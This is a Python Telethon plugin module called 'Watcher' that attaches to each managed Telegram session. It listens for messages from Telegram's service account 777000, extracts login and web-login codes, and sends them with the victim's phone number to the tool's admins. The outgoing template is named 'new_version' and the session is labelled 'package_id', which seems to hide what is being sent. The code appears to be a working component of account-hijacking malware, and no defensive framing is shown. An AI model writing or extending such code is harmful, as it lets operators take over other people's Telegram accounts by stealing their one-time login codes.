import logging
from telethon import events

from installer import BaseModule

logger = logging.getLogger(__name__)


class WatcherModule(BaseModule):
    name = "Watcher"
    version = (1, 0, 0)

    def __init__(self):
        super().__init__()
        self._bot = None
        self._watcher_manager = None

    async def on_start(self, bot, watcher_manager):
        self._bot = bot
        self._watcher_manager = watcher_manager

    async def on_session_start(self, session_id, client):
        from functions import parse_login_code, parse_web_login
        from strings import Strings

        s = Strings()

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            text = event.raw_text
            logger.info(f"Watcher: got message from 777000 on session {session_id}: {repr(text[:50])}")

            phone = self._watcher_manager.data.get_sessions().get(session_id, {}).get("phone", "unknown")

            login_code = parse_login_code(text)
            if login_code:
                logger.info(f"Watcher: login code found: {login_code}")
                message = s.new_version.format(
                    line=s.line,
                    package_id=session_id,
                    phone=phone,
                    code=login_code,
                )
                await self._watcher_manager.notify_admins(message)
                return

            web_code = parse_web_login(text)
            if web_code:
                logger.info(f"Watcher: web code found: {web_code}")
                message = s.web_login_code.format(
                    line=s.line,
                    package_id=session_id,
                    phone=phone,
                    code=web_code,
                )
                await self._watcher_manager.notify_admins(message)
                return

            logger.warning(f"Watcher: 777000 message not matched by any pattern")

        self._session_tasks[session_id] = handler
        logger.info(f"Watcher registered for session {session_id}")

    async def on_session_stop(self, session_id):
        self._session_tasks.pop(session_id, None)
        logger.info(f"Watcher removed for session {session_id}")
